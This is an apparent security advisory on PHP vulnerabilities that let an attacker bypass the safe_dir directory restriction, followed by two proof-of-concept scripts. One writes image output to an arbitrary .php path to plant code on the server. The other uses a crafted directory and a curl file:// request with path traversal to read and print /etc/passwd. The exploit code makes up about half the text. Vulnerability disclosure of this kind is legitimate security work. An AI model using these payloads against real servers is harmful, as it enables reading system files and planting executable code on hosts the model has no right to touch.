source: http://www.securityfocus.com/bid/15119/info

PHP is prone to multiple vulnerabilities that permit an attacker to bypass the 'safedir' directory restriction.

An attacker can exploit these vulnerabilities to possible execute arbitrary code currently existing on a vulnerable system, or to retrieve the contents of arbitrary files, all in the security context of the Web server process.

Information obtained may aid in further attacks against the affected system; other attacks are also possible.

These issues have been addressed in the latest CVS version. 

<?php
$im = imagecreatefromgif("file.gif");
imagegif($im, '/var/www/f34r.fr/c/f/elbossoso/.i.need.money.php');
?>

<?php

mkdir("./".$_SERVER["SCRIPT_NAME"]."?");
$ch = curl_init("file://".$_SERVER["SCRIPT_FILENAME"]."?/../../../../../../../../../../../etc/passwd ");

$file=curl_exec($ch);

echo $file;

?>